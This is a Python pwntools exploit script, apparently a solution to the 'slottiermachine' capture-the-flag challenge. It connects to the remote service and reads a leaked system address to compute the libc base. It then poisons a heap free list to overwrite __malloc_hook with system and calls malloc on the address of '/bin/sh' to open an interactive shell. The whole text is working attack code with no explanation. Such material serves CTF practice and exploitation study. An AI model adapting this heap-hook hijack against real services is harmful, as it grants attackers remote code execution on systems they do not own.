from pwn import *
DEBUG = 0
REMOTE = 0
context.terminal = "tmux splitw -h -f".split()
cmd = ""
#p = process("./slottiermachine")
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
p = remote("slottiermachine.uni.hctf.fun", 13371)
libc = ELF('./libc-2.28.so', checksec=False)
if not REMOTE and DEBUG:
    gdb.attach(p, cmd, gdb_args=["--init-eval-command='source /ctf/tools/gef/gef.py'"])

def goto(n):
    p.sendlineafter("bye!\n", str(n))

def malloc(n):
    goto(1)
    p.recvline()
    p.sendline(str(n))
    return

def free(n=0):
    goto(2)
    p.recvline()
    p.sendline(str(n))
    return

def write(c):
    goto(3)
    p.sendline(c)
    return

p.recvuntil(": ")
system = int(p.recvline(), 16)
libc.symbols['one_gadget'] = 0x10a38c
libc.address = system - libc.symbols['system']
free_hook = libc.symbols['__free_hook']
malloc_hook = libc.symbols['__malloc_hook']
one_gadget = libc.symbols['one_gadget']
binsh = libc.search("/bin/sh").next()
print(hex(libc.address))
malloc(8)
free(0)
write(p64(malloc_hook))
malloc(8)
malloc(8)
write(p64(system))
malloc(binsh)
p.interactive()
